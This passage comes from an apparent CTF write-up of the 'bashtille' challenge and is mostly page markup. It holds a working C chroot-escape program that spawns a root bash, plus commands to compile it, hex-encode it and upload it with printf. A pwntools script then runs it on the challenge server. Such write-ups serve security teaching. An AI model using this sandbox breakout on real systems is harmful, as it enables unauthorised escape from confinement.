style="--0:#032F62;--1:#9ECBFF">&quot;.&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">system</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin/bash&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#include <sys/stat.h>#include <stdlib.h>#include <unistd.h>int main(void){  chroot(&#34;.&#34;);  chdir(&#34;../../../&#34;);  chroot(&#34;.&#34;);  system(&#34;/bin/bash&#34;);}"><div></div></button></div></figure></div>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:26ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">$ gcc exploit.c -o exploit</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">$ strip exploit</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ gcc exploit.c -o exploit$ strip exploit"><div></div></button></div></figure></div>
<p>The biggest problem here is the question of how do we get the binary on the server? The answer to that is we can use <code>printf</code> which supports taking taking in hex string and writing it to a file.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:63ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">$ ncat --ssl bashtille.challs.pwnoh.io 1337</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">bash-5.2# printf &#39;\x61\x62\x63\x0a&#39; &gt; test</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">bash-5.2# while IFS= read -r line; do echo &quot;$line&quot;; done &lt; test</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">abc</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ ncat --ssl bashtille.challs.pwnoh.io 1337...SNIP...bash-5.2# printf '\x61\x62\x63\x0a' > testbash-5.2# while IFS= read -r line; do echo &#34;$line&#34;; done < testabc"><div></div></button></div></figure></div>
<p>We can convert the binary to this using <code>python</code>:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:75ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">$ python3 - &lt;&lt;&#39;PY&#39; &gt; exploit.hex</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">import sys</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">sys.stdout.write(&quot;&quot;.join(&quot;\\x%02x&quot;%b for b in open(&quot;exploit&quot;,&quot;rb&quot;).read()))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">PY</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ python3 - <<'PY' > exploit.heximport syssys.stdout.write(&#34;&#34;.join(&#34;\\x%02x&#34;%b for b in open(&#34;exploit&#34;,&#34;rb&#34;).read()))PY"><div></div></button></div></figure></div>
<p>Once we have the binary on the server we can use <code>/lib64/ld-linux-x86-64.so.2</code> to run it like this <code>/lib64/ld-linux-x86-64.so.2 ./exploit</code> using the following script which reads the <code>exploit.hex</code> and, runs <code>printf &#39;&lt;contents of exploit.hex&gt;&#39; &gt; exploit</code> and, <code>/lib64/ld-linux-x86-64.so.2 ./exploit</code>.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:89ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">from</span><span style="--0:#24292E;--1:#E1E4E8"> pwn </span><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> remote(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;bashtille.challs.pwnoh.io&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">1337</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#AE4B07;--1:#FFAB70">ssl</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#005CC5;--1:#79B8FF">True</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;# &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">f</span><span style="--0:#032F62;--1:#9ECBFF">&quot;printf &#39;</span><span style="--0:#005CC5;--1:#79B8FF">{open</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&#39;exploit.hex&#39;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#032F62;--1:#9ECBFF">&#39;r&#39;</span><span style="--0:#24292E;--1:#E1E4E8">).read()</span><span style="--0:#005CC5;--1:#79B8FF">}</span><span style="--0:#032F62;--1:#9ECBFF">&#39; &gt; exploit&quot;</span><span style="--0:#24292E;--1:#E1E4E8">.encode())</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;# &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/lib64/ld-linux-x86-64.so.2 ./exploit&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="from pwn import *io = remote(&#34;bashtille.challs.pwnoh.io&#34;, 1337, ssl=True)io.sendlineafter(b&#34;# &#34;, f&#34;printf '{open('exploit.hex', 'r').read()}' > exploit&#34;.encode())io.sendlineafter(b&#34;# &#34;, b&#34;/lib64/ld-linux-x86-64.so.2 ./exploit&#34;)io.interactive()"><div></div></button></div></figure></div>
<p><img src="https://github.com/user-attachments/assets/a246ae7b-d5c1-4973-a893-5bb50a1fd9ce" alt/></p> </article>  <nav class="col-start-2 grid grid-cols-1 gap-4 sm:grid-cols-2"> <a href="/blog/buckeye-2025_heap_exploitation#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-start size-full" aria-disabled="false">  <svg width="1em" height="1em" viewBox="0 0 24 24" class="mr-2 size-4 transition-transform group-hover:-translate-x-1" data-icon="lucide:arrow-left">   <use href="#ai:lucide:arrow-left"></use>  </svg> <div class="flex flex-col items-start overflow-hidden text-wrap"> <span class="text-muted-foreground text-left text-xs"> Previous Post </span> <span class="w-full text-left text-sm text-balance text-ellipsis"> Buckeye 2025 – forensics/heap_exploitation? </span> </div>  </a>  <a href="/blog/blackhat-mea-2025_verifmt#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-end size-full" aria-disabled="false">  <div class="flex flex-col items-end overflow-hidden text-wrap"> <span class="text-muted-foreground text-right text-xs"> Next Post </span> <span class="w-full text-right text-sm text-balance text-ellipsis"> Blackhat MEA CTF Final 2025 – pwn/verifmt </span> </div> <svg width="1em" height="1em" viewBox="0 0 24 24" class="ml-2 size-4 transition-transform group-hover:translate-x-1" data-icon="lucide:arrow-right">   <use href="#ai:lucide:arrow-right"></use>  </svg>  </a> </nav> </section> <button data-slot="button" class="items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9 group fixed right-8 bottom-8 z-50 hidden" id="scroll-to-top" title="Scroll to top" aria-label="Scroll to top"> <svg width="1em" height="1em" class="mx-auto size-4 transition-all group-hover:-translate-y-0.5" data-icon="lucide:arrow-up">   <symbol id="ai:lucide:arrow-up" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m5 12l7-7l7 7m-7 7V5"/></symbol><use href="#ai:lucide:arrow-up"></use>  </svg> </button> <script type="module">if(document.querySelector(".katex")&&!document.querySelector('link[href*="katex.min.css"]')){const e=document.createElement("link");e.rel="stylesheet",e.href="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.css",document.head.appendChild(e)}</script>  </main> <footer class="mx-auto mb-8 flex w-full max-w-3xl flex-col items-center justify-center gap-y-2 px-4 sm:mb-4 sm:flex-row sm:justify-between"> <div class="flex flex-wrap items-center justify-center gap-x-2 text-center"> <span class="text-muted-foreground text-sm">
&copy; 2025 z0v3r1n
</span> </div> <ul class="flex flex-wrap gap-2" role="list"> <li> <a href="https://github.com/z0v3r1n" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="GitHub" title="GitHub">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:github">   <symbol id="ai:lucide:github" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5c.08-1.25-.27-2.48-1-3.5c.28-1.15.28-2.35 0-3.5c0 0-1 0-3 1.5c-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.4 5.4 0 0 0 4 9c0 3.5 3 5.5 6 5.5c-.39.49-.68 1.05-.85 1.65S8.93 17.38 9 18v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></g></symbol><use href="#ai:lucide:github"></use>  </svg>  </a> </li><li> <a href="https://x.com/z0v3r1n" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="Twitter" title="Twitter">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:twitter">   <symbol id="ai:lucide:twitter" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6c2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4c-.9-4.2 4-6.6 7-3.8c1.1 0 3-1.2 3-1.2"/></symbol><use href="#ai:lucide:twitter"></use>  </svg>  </a> </li><li> <a href="mailto:zoverin@proton.me" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="Email" title="Email">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:mail">   <symbol id="ai:lucide:mail" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="m22 7l-8.991 5.727a2 2 0 0 1-2.009 0L2 7"/><rect width="20" height="16" x="2" y="4" rx="2"/></g></symbol><use href="#ai:lucide:mail"></use>  </svg>  </a> </li> </ul> </footer> </body></html> <script type="module">document.addEventListener("astro:page-load",()=>{const o=document.getElementById("scroll-to-top"),t=document.querySelector("footer");o&&t&&(o.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})}),window.addEventListener("scroll",()=>{const e=t.getBoundingClientRect().top<=window.innerHeight;o.classList.toggle("hidden",window.scrollY<=300||e)}))});</script>